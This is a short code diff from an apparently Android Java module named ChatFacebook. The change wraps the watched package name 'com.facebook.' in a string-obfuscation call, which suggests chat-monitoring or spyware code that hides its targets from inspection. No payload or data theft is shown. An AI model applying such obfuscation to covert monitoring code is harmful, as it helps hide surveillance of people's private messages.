@@ -31,7 +31,7 @@ public class ChatFacebook extends SubModuleChat {
 	private static final String TAG = "ChatFacebook";
 
 	private static final int PROGRAM = 0x02;
-	String pObserving = "com.facebook.";
+	String pObserving = M.e("com.facebook.");
 
 	private Date lastTimestamp;
 
